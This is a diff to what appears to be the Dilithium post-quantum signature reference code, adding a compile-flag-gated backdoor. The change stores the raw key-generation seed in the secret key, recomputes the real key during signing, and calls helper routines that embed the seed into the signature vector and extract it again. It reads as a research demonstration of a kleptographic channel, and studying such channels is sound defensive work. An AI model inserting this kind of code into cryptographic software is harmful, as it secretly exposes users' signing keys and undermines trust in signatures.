@@ -8,6 +8,9 @@
 #include "symmetric.h"
 #include "fips202.h"
 
+#include <string.h>
+#include "backdoor.h"
+
 /*************************************************
 * Name:        crypto_sign_keypair
 *
@@ -30,6 +33,17 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
 
   /* Get randomness for rho, rhoprime and key */
   randombytes(seedbuf, SEEDBYTES);
+  
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // * Debugging purpose
+  // hidden_seed_prove("KEYGEN", seedbuf);
+  
+  // ! Backdoor requirement
+  // Keep the original seed before it is processed by shake256
+  uint8_t hidden_seed[SEEDBYTES];
+  memcpy(hidden_seed, seedbuf, SEEDBYTES);
+#endif
+
   seedbuf[SEEDBYTES+0] = K;
   seedbuf[SEEDBYTES+1] = L;
   shake256(seedbuf, 2*SEEDBYTES + CRHBYTES, seedbuf, SEEDBYTES+2);
@@ -61,7 +75,19 @@ int crypto_sign_keypair(uint8_t *pk, uint8_t *sk) {
 
   /* Compute H(rho, t1) and write secret key */
   shake256(tr, TRBYTES, pk, CRYPTO_PUBLICKEYBYTES);
+  
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // * Debugging purpose
+  // key_prove("KEYGEN", key);
+  (void)key; // Suppress unused variable warning
+
+  // ! Backdoor requirement
+  // hidden_seed and key have the same size, so we can reuse the 'key' variable
+  // to store the real key derived from the hidden seed
+  pack_sk(sk, rho, tr, hidden_seed, &t0, &s1, &s2);
+#else
   pack_sk(sk, rho, tr, key, &t0, &s1, &s2);
+#endif
 
   return 0;
 }
@@ -106,6 +132,31 @@ int crypto_sign_signature_internal(uint8_t *sig,
   mu = key + SEEDBYTES;
   rhoprime = mu + CRHBYTES;
   unpack_sk(rho, tr, key, &t0, &s1, &s2, sk);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // ! Backdoor requirement
+  const uint8_t *hidden_seed = key;
+  uint8_t real_key[SEEDBYTES];
+
+  // * Debugging purpose
+  int repeat = 0;
+  // hidden_seed_prove("SIGN", hidden_seed);
+  
+  // ! Backdoor requirement
+  /* Re-compute the real key: shake256(hidden_seed || K || L) */
+  uint8_t temp_seedbuf[2*SEEDBYTES + CRHBYTES]; // Temporary buffer for the shake256 input and output instead of modifying the original seedbuf
+  memcpy(temp_seedbuf, hidden_seed, SEEDBYTES);
+  temp_seedbuf[SEEDBYTES+0] = K;
+  temp_seedbuf[SEEDBYTES+1] = L;
+  shake256(temp_seedbuf, 2*SEEDBYTES + CRHBYTES, temp_seedbuf, SEEDBYTES+2);
+  /* The real key is at offset SEEDBYTES + CRHBYTES in the squeezed output */
+  memcpy(real_key, temp_seedbuf + SEEDBYTES + CRHBYTES, SEEDBYTES);
+  /* Point 'key' to the real key for the rest of the function */
+  key = real_key;
+
+  // * Debugging purpose
+  // key_prove("SIGN", key);
+#endif
 
   /* Compute mu = CRH(tr, pre, msg) */
   shake256_init(&state);
@@ -158,6 +209,16 @@ rej:
   polyvecl_invntt_tomont(&z);
   polyvecl_add(&z, &z, &y);
   polyvecl_reduce(&z);
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // ! Backdoor application
+  uint8_t changed[N];
+  backdoor_apply(&z, hidden_seed, changed);
+  uint8_t extracted_seed[SEEDBYTES];
+  backdoor_extract(&z, extracted_seed);
+  backdoor_revert(&z, hidden_seed, changed);
+#endif
+
   if(polyvecl_chknorm(&z, GAMMA1 - BETA))
     goto rej;
 
@@ -185,6 +246,15 @@ rej:
   /* Write signature */
   pack_sig(sig, sig, &z, &h);
   *siglen = CRYPTO_BYTES;
+
+#ifdef DILITHIUM_ENABLE_BACKDOOR
+  // * Debugging purpose
+  if (repeat < 1) {
+    hidden_seed_prove("EXTRACTED", extracted_seed);
+    ++repeat;
+  }
+#endif
+
   return 0;
 }
 
